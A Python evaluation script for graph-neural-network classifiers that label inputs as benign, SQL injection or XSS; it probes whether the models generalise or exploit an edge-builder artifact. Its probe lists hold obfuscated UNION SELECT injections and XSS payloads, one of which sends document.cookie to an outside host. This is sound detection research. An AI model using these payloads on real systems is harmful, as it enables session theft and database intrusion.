"""Does HGT generalize, or does it exploit the E_sem builder / the narrow held-out templates?

  A. How E_sem presence relates to the label in train / held-out matrix / external (is "has an E_sem
     edge" already a near-perfect attack rule that a typed channel can read off?).
  B. How many DISTINCT inputs the 90-row matrix really contains (digits masked).
  C. Fresh probes OUTSIDE the 9 held-out templates (hand-written here, eval-only, NOT added to any
     dataset): comment-split SQLi variants, SQLi obfuscations the E_sem builder is blind to, and
     benign strings that contain E_sem keyword pairs.
  D. External dataset: false-positive structure per model/seed -- Benign recall split by
     "has E_sem edge" and by graph size, and Benign recall after deleting E_sem edges at inference.

Models: typed HGT, HGT-collapsed / HGT-random controls (if trained), GATv2. 5 seeds each.
Writes data/hgt_generalization_report.txt and results/hgt_generalization_*.csv.
"""
import pickle
from collections import Counter
from pathlib import Path

import numpy as np
import pandas as pd
import torch

from scripts.hgt_investigation_common import (CLASS_NAMES, DATA_DIR, EXTERNAL_CSV, EXTERNAL_EA, GRAPHS_EA, ROOT,
                                             SEEDS, apply_condition, load_model, load_pkl_graphs, logits_of,
                                             matrix_graphs, test_split_graphs, uses_edge_attr)
from scripts.train_baseline import ckpt_path as base_ckpt
from scripts.train_hgt_control import ckpt_path as ctl_ckpt
from src.bag.graph_builder import build_single_graph
from src.models.hgt_controls import CONTROL_NAMES

MODELS = ['hgt', 'hgt_collapsed', 'hgt_random', 'gatv2']
DEVICE = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
BUCKETS = [(1, 1), (2, 2), (3, 3), (4, 6), (7, 12), (13, 10 ** 9)]

# ---- C. fresh probes (hand-written; label = intended class) --------------------------------------
PROBES = {
    # comment-split SQLi where the E_sem builder DOES reconstruct the keywords (like the matrix cell, other wording)
    'sqli_split_builder_sees': [
        "id=1 UN/**/ION SE/**/LECT username,password FR/**/OM accounts--",
        "q=5' UNI/**/ON SEL/**/ECT NULL,NULL FR/**/OM dual-- -",
        "uid=7 UNION/**/SELECT 1,2,3 FR/**/OM users WH/**/ERE 1=1",
        "cat=3 UN/**/ION AL/**/L SE/**/LECT name FR/**/OM items--",
        "x=9;UNI/**/ON SEL/**/ECT pass FR/**/OM admin LIM/**/IT 1;--",
        "page=2 UN/**/ION SE/**/LECT * FR/**/OM orders OR/**/DER B/**/Y 1--",
    ],
    # SQLi obfuscated so that the builder's noise set {/,*,-,#} does NOT let it rebuild the keywords -> no E_sem edge
    'sqli_obfusc_builder_blind': [
        "id=1 UNI+ON SEL+ECT username,password FR+OM accounts--",
        "q=5' UN%0aION SE%0aLECT NULL,NULL FR%0aOM dual-- -",
        "uid=7 UNION SELECT 1,2,3 FROM users WHERE 1=1",   # plain (no split): E_sem should exist
        "cat=3 U/*x*/NION SEL/*y*/ECT name FR/*z*/OM items--",
        "x=9;UNI%2f%2a%2a%2fON SEL%2f%2a%2a%2fECT pass FR%2f%2a%2a%2fOM admin;--",
        "page=2 uni!on sel!ect * fr!om orders--",
    ],
    # benign prose / params that contain E_sem keyword pairs -> builder creates an E_sem edge; label Benign
    'benign_with_sem_pairs': [
        "Please order by date and group by category in the monthly report",
        "select the best option from the list below",
        "GET /search?q=order+by+price&sort=asc HTTP/1.1",
        "the union select committee meets on friday",
        "group by region then order by revenue",
        "select name from the dropdown and press save",
    ],
    # benign, short / address-number-like (the external benign regime), no keyword pairs
    'benign_short': [
        "12 Baker Street",
        "42",
        "john.smith@example.com",
        "page=3&sort=asc",
        "Hanoi, Vietnam 100000",
        "user_1187",
    ],
    # XSS with E_sem-free wording (not the matrix templates)
    'xss_new': [
        "<img src=x onerror=alert(document.domain)>",
        "<body onpageshow=fetch('//e.io/'+document.cookie)>",
        "<iframe srcdoc='<script>parent.x(1)</script>'></iframe>",
        "<details open ontoggle=confirm(1)>",
        "<a href=\"jav&#x61;script:alert(1)\">go</a>",
        "<input autofocus onfocus=prompt(1)>",
    ],
}
PROBE_LABEL = {'sqli_split_builder_sees': 1, 'sqli_obfusc_builder_blind': 1, 'benign_with_sem_pairs': 0,
               'benign_short': 0, 'xss_new': 2}


def available(key, seed):
    p = ctl_ckpt(key, seed) if key in CONTROL_NAMES else base_ckpt(key, seed)
    return p.exists()


def has_sem(g):
    return bool((g.edge_attr.argmax(dim=1) == 2).any())


def n_sem_edges(g):
    return int((g.edge_attr.argmax(dim=1) == 2).sum())


def bucket_name(lo_hi):
    lo, hi = lo_hi
    return f"{lo}" if lo == hi else (f"{lo}+" if hi >= 10 ** 9 else f"{lo}-{hi}")


def main():
    L = []
    out = lambda s='': (L.append(s), print(s, flush=True))

    # ---- load graphs ----
    train_g = load_pkl_graphs(GRAPHS_EA)
    test_g = test_split_graphs()
    df_m, mat_g = matrix_graphs()
    ext_g = load_pkl_graphs(EXTERNAL_EA)
    ext_y = np.array([int(g.y) for g in ext_g])

    # ---- A. E_sem vs label ----
    out("=== A. E_sem presence vs label (fraction of graphs with >=1 E_sem edge) ===")
    tr_y = np.array([int(g.y) for g in train_g])
    tr_sem = np.array([has_sem(g) for g in train_g])
    ex_sem = np.array([has_sem(g) for g in ext_g])
    rows = []
    for name, y, s in (('train+test (43,659)', tr_y, tr_sem), ('external (30,677)', ext_y, ex_sem)):
        for c in range(3):
            rows.append((name, CLASS_NAMES[c], int((y == c).sum()), f"{s[y == c].mean():.4f}"))
    m_sem = np.array([has_sem(g) for g in mat_g])
    for cell, sub in df_m.groupby(['class_name', 'technique'], sort=False):
        rows.append(('held-out matrix', '/'.join(cell), len(sub), f"{m_sem[sub.index.values].mean():.4f}"))
    out(pd.DataFrame(rows, columns=['set', 'class/cell', 'n', 'frac_with_E_sem']).to_string(index=False))
    for name, y, s in (('train+test', tr_y, tr_sem), ('external', ext_y, ex_sem)):
        atk = y != 0
        out(f"  rule 'has E_sem => attack' on {name}: precision={((s & atk).sum() / max(s.sum(), 1)):.4f}  recall={((s & atk).sum() / atk.sum()):.4f}")
    out()

    # ---- B. distinct inputs in the matrix ----
    out("=== B. Distinct inputs in the 90-row held-out matrix (digits masked) ===")
    import re
    df_m['masked'] = df_m['content'].map(lambda s: re.sub(r'\d+', '#', s))
    per_cell = df_m.groupby(['class_name', 'technique'], sort=False)['masked'].nunique()
    out(f"  distinct masked templates per cell: {dict(per_cell.astype(int).to_dict())}")
    out(f"  total distinct = {df_m['masked'].nunique()} of {len(df_m)} rows")
    sizes = df_m.assign(n_nodes=[g.num_nodes for g in mat_g]).groupby(['class_name', 'technique'], sort=False)['n_nodes'].agg(['min', 'max'])
    out("  node counts per cell (min,max): " + "; ".join(f"{'/'.join(k)}={int(v['min'])}-{int(v['max'])}" for k, v in sizes.iterrows()))
    out()

    # ---- graph-size regime: train per class vs external benign vs matrix benign ----
    out("=== Graph-size regime (fraction of graphs per node-count bucket) ===")
    def dist(sizes):
        sizes = np.asarray(sizes)
        return [f"{np.mean([(lo <= s <= hi) for s in sizes]):.3f}" for lo, hi in BUCKETS]
    tab = pd.DataFrame({
        'train Benign': dist([g.num_nodes for g, y in zip(train_g, tr_y) if y == 0]),
        'train SQLi': dist([g.num_nodes for g, y in zip(train_g, tr_y) if y == 1]),
        'train XSS': dist([g.num_nodes for g, y in zip(train_g, tr_y) if y == 2]),
        'external Benign': dist([g.num_nodes for g, y in zip(ext_g, ext_y) if y == 0]),
        'external SQLi': dist([g.num_nodes for g, y in zip(ext_g, ext_y) if y == 1]),
        'external XSS': dist([g.num_nodes for g, y in zip(ext_g, ext_y) if y == 2]),
        'matrix Benign': dist([g.num_nodes for g, y in zip(mat_g, df_m['attack_type']) if y == 0]),
    }, index=[bucket_name(b) for b in BUCKETS])
    out(tab.to_string())
    out()

    # ---- C. fresh probes ----
    out("=== C. Fresh probes outside the 9 held-out templates (hand-written; 6 strings per group, per seed) ===")
    probe_graphs, probe_meta = [], []
    for grp, strs in PROBES.items():
        for s in strs:
            g = build_single_graph(s, source_uid='probe', attack_type=PROBE_LABEL[grp], use_edge_attr=True)
            probe_graphs.append(g)
            probe_meta.append((grp, s, n_sem_edges(g), g.num_nodes))
    out("E_sem edges the builder produced per string (0 == builder blind):")
    for grp in PROBES:
        out(f"  {grp:28s} " + str([m[2] for m in probe_meta if m[0] == grp]))
    res = {}
    for key in MODELS:
        for seed in SEEDS:
            if not available(key, seed):
                continue
            model = load_model(key, seed, DEVICE)
            lg = logits_of(model, probe_graphs, uses_edge_attr(key), DEVICE)
            res[(key, seed)] = lg.argmax(1).numpy()
    y_probe = np.array([PROBE_LABEL[m[0]] for m in probe_meta])
    grp_arr = np.array([m[0] for m in probe_meta])
    tab_rows = []
    for key in MODELS:
        seeds = [s for s in SEEDS if (key, s) in res]
        if not seeds:
            continue
        row = {'model': key, 'seeds': len(seeds)}
        for grp in PROBES:
            m = grp_arr == grp
            row[grp] = f"{sum(int((res[(key, s)][m] == y_probe[m]).sum()) for s in seeds)}/{m.sum() * len(seeds)}"
        tab_rows.append(row)
    out("correct / (6 strings x seeds):")
    out(pd.DataFrame(tab_rows).to_string(index=False))
    out("per-string, HGT typed (predictions over 5 seeds; B=Benign S=SQLi X=XSS):")
    for i, m in enumerate(probe_meta):
        if all(('hgt', s) in res for s in SEEDS):
            preds = ''.join('BSX'[res[('hgt', s)][i]] for s in SEEDS)
            gat = ''.join('BSX'[res[('gatv2', s)][i]] for s in SEEDS) if all(('gatv2', s) in res for s in SEEDS) else '?'
            out(f"  [{'BSX'[y_probe[i]]}] hgt={preds} gatv2={gat} sem={m[2]} n={m[3]:2d}  {m[1][:70]}")
    out()

    # ---- D. external ----
    out("=== D. External dataset: Benign false-positive structure (n_benign, has E_sem vs not; size buckets) ===")
    ben = ext_y == 0
    n_ben = int(ben.sum())
    ext_nodes = np.array([g.num_nodes for g in ext_g])
    out(f"external Benign n={n_ben}; with E_sem: {int((ben & ex_sem).sum())} ({(ben & ex_sem).sum() / n_ben:.4f})")
    ext_rows = []
    drop_cache = None
    for key in MODELS:
        for seed in SEEDS:
            if not available(key, seed):
                continue
            model = load_model(key, seed, DEVICE)
            ea = uses_edge_attr(key)
            pred = logits_of(model, ext_g, ea, DEVICE, batch_size=512).argmax(1).numpy()
            row = dict(model=key, seed=seed,
                       benign_recall=float((pred[ben] == 0).mean()),
                       ben_recall_noSem=float((pred[ben & ~ex_sem] == 0).mean()),
                       ben_recall_withSem=float((pred[ben & ex_sem] == 0).mean()) if (ben & ex_sem).any() else np.nan,
                       sqli_recall=float((pred[ext_y == 1] == 1).mean()), xss_recall=float((pred[ext_y == 2] == 2).mean()),
                       frac_FP_that_have_sem=float(ex_sem[ben & (pred != 0)].mean()) if (ben & (pred != 0)).any() else np.nan,
                       ben_FP_as=dict(Counter(CLASS_NAMES[p] for p in pred[ben & (pred != 0)])))
            for lo_hi in BUCKETS:
                b = ben & (ext_nodes >= lo_hi[0]) & (ext_nodes <= lo_hi[1])
                row[f"ben_rec_n{bucket_name(lo_hi)}"] = float((pred[b] == 0).mean()) if b.any() else np.nan
            if key == 'hgt':
                drop = [apply_condition(g, 'drop_sem') for g in ext_g]
                pred_d = logits_of(model, drop, True, DEVICE, batch_size=512).argmax(1).numpy()
                row['benign_recall_dropSem'] = float((pred_d[ben] == 0).mean())
                row['sqli_recall_dropSem'] = float((pred_d[ext_y == 1] == 1).mean())
                row['xss_recall_dropSem'] = float((pred_d[ext_y == 2] == 2).mean())
            ext_rows.append(row)
            print(f"  done {key} seed {seed}: benign_recall={row['benign_recall']:.3f}", flush=True)
    ext_df = pd.DataFrame(ext_rows)
    ext_df.to_csv(ROOT / 'results' / 'hgt_generalization_external.csv', index=False)
    with pd.option_context('display.width', 250, 'display.max_columns', 30):
        show = ['model', 'seed', 'benign_recall', 'ben_recall_noSem', 'ben_recall_withSem', 'frac_FP_that_have_sem',
                'sqli_recall', 'xss_recall'] + [c for c in ext_df.columns if c.endswith('dropSem')]
        out(ext_df[show].round(3).to_string(index=False))
        out("Benign recall by graph size (number of tokens):")
        out(ext_df[['model', 'seed'] + [c for c in ext_df.columns if c.startswith('ben_rec_n')]].round(3).to_string(index=False))
        out("Benign false positives predicted as:")
        for r in ext_rows:
            out(f"  {r['model']:14s} seed {r['seed']}: {r['ben_FP_as']}")
    (DATA_DIR / 'hgt_generalization_report.txt').write_text("\n".join(L) + "\n")
    print("[+] wrote data/hgt_generalization_report.txt")


if __name__ == '__main__':
    main()
